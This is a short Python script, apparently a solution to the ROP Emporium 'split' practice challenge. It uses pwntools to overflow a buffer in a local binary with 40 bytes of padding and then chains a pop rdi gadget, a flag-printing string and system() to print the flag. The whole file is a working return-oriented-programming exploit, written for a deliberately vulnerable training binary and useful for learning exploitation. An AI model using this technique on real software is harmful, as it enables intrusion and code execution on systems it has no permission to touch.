from pwn import *

system_call = 0x4005e0
cat_flag = 0x601060
main = 0x400746
poprdi = 0x400883
ret = 0x400806

p = process('./split')

exploit = ''
exploit += 'A'*40
exploit += p64(poprdi)
exploit += p64(cat_flag)
exploit += p64(ret)
# Used ret because I'm on Ubuntu 18.04. Probably wont be required in previous versions
# For more info see MOVAPS issue https://ropemporium.com/guide.html#Common%20pitfalls
exploit += p64(system_call)

p.recvuntil('>')
p.sendline(exploit)
print p.recvuntil('}', timeout=0.01)